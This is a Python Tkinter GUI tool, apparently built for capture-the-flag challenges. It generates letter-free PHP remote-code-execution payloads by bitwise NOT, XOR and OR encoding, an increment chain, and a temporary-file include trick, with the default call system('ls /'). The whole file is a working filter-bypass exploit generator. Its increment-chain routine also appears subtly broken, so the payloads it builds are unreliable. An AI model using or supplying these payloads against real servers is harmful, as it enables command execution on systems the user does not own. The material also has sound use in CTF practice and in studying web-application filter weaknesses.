import tkinter as tk
from tkinter import ttk, messagebox

class RCEGenerator:
    @staticmethod
    def php_not(func, cmd):
        """取反法生成payload"""
        def negate(s):
            return ''.join([f"%{(~ord(c)) & 0xFF:02X}" for c in s]).upper()
        return f"(~{negate(func)})(~{negate(cmd)});"

    @staticmethod
    def php_xor(func, cmd):
        """异或法生成payload（基于文件查找并修正格式）"""
        def action(arg):
            s1 = ""
            s2 = ""
            with open("xor_rce.txt", "r", encoding="utf-8") as f:
                for i in arg:
                    f.seek(0)  # 重置文件指针到开头
                    while True:
                        t = f.readline()
                        if t == "": break
                        if len(t) > 9 and t[0] == i:  # 确保有足够长度避免索引错误
                            s1 += t[2:5]
                            s2 += t[6:9]
                            break
            return f"\"{s1}\"^\"{s2}\""

        func_encoded = action(func)
        cmd_encoded = action(cmd)
        return f"({func_encoded})({cmd_encoded});"

    @staticmethod
    def php_or(func, cmd):
        """或运算生成payload（基于文件查找并修正格式）"""
        def action(arg):
            s1 = ""
            s2 = ""
            with open("or_rce.txt", "r", encoding="utf-8") as f:
                for i in arg:
                    f.seek(0)  # 重置文件指针到开头
                    while True:
                        t = f.readline()
                        if t == "": break
                        if len(t) > 9 and t[0] == i:  # 确保有足够长度避免索引错误
                            s1 += t[2:5]
                            s2 += t[6:9]
                            break
            return f"\"{s1}\"|\"{s2}\""

        func_encoded = action(func)
        cmd_encoded = action(cmd)
        # 直接将func和cmd的结果拼接起来，不添加额外的括号
        return f"({func_encoded})({cmd_encoded});"

    @staticmethod
    def php_inc(func, cmd):
        """自增链生成"""
        def build_chain(target):
            chain = []
            current = ord('A')
            for c in target:
                steps = ord(c) - current
                chain.append(('$__++' * steps).rstrip('+'))
                current = ord(c)
            return '.'.join(chain)
        
        nl = '\n'
        return (
            f"$__='A';{nl}"
            f"$__=({build_chain(func)});{nl}"
            f"$__({build_chain(cmd)});{nl}"
        )

    @staticmethod
    def php_tempfile(func, cmd):
        """临时文件利用法"""
        return (
            "$f=tmpfile();\n"
            f"fwrite($f,\"<?php {func}('{cmd}');?>\");\n"
            "$d=stream_get_meta_data($f)['uri'];\n"
            "include($d);\n"
        )

class Application(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CTF-无字母RCE v1.0 by congci6")
        self.geometry("900x700")
        self._create_widgets()

    def _create_widgets(self):
        # 输入区
        input_frame = ttk.LabelFrame(self, text="输入参数")
        ttk.Label(input_frame, text="PHP Function:").grid(row=0, column=0, padx=5, pady=5)
        self.func_entry = ttk.Entry(input_frame)
        self.func_entry.grid(row=0, column=1, padx=5, pady=5, sticky='ew')
        self.func_entry.insert(0, 'system')

        ttk.Label(input_frame, text="Command:").grid(row=1, column=0, padx=5, pady=5)
        self.cmd_entry = ttk.Entry(input_frame)
        self.cmd_entry.grid(row=1, column=1, padx=5, pady=5, sticky='ew')
        self.cmd_entry.insert(0, 'ls /')
        input_frame.pack(fill='x', padx=10, pady=5)

        # 方法选择
        method_frame = ttk.LabelFrame(self, text="生成方法")
        self.method_var = tk.StringVar(value='not')
        methods = [
            ('取反法', 'not'),
            ('异或法', 'xor'),
            ('或运算法', 'or'),
            ('自增链', 'inc'),
            ('临时文件', 'tempfile')
        ]
        for col, (text, val) in enumerate(methods):
            rb = ttk.Radiobutton(method_frame, text=text, value=val, variable=self.method_var)
            rb.grid(row=0, column=col, padx=5, pady=5)
        method_frame.pack(fill='x', padx=10, pady=5)

        # 操作按钮
        btn_frame = ttk.Frame(self)
        ttk.Button(btn_frame, text="生成", command=self._generate).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="清空", command=self._clear).pack(side='left', padx=5)
        btn_frame.pack(pady=10)

        # 输出区
        output_frame = ttk.LabelFrame(self, text="Payload 输出")
        self.output_text = tk.Text(output_frame, wrap=tk.WORD, font=('Consolas', 10))
        scrollbar = ttk.Scrollbar(output_frame, orient='vertical', command=self.output_text.yview)
        self.output_text.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side='right', fill='y')
        self.output_text.pack(fill='both', expand=True, padx=5, pady=5)
        output_frame.pack(fill='both', expand=True, padx=10, pady=5)

    def _generate(self):
        func = self.func_entry.get().strip()
        cmd = self.cmd_entry.get().strip()
        method = self.method_var.get()

        if not func or not cmd:
            messagebox.showwarning("输入错误", "必须填写Function和Command")
            return

        try:
            generator = RCEGenerator()
            if method == 'not':
                payload = generator.php_not(func, cmd)
            elif method == 'xor':
                payload = generator.php_xor(func, cmd)
            elif method == 'or':
                payload = generator.php_or(func, cmd)
            elif method == 'inc':
                payload = generator.php_inc(func, cmd)
            elif method == 'tempfile':
                payload = generator.php_tempfile(func, cmd)
            else:
                payload = "未知方法"

            self.output_text.delete(1.0, tk.END)
            self.output_text.insert(tk.END, payload)
        except Exception as e:
            messagebox.showerror("生成错误", str(e))

    def _clear(self):
        self.func_entry.delete(0, tk.END)
        self.cmd_entry.delete(0, tk.END)
        self.output_text.delete(1.0, tk.END)

if __name__ == "__main__":
    app = Application()
    app.mainloop()
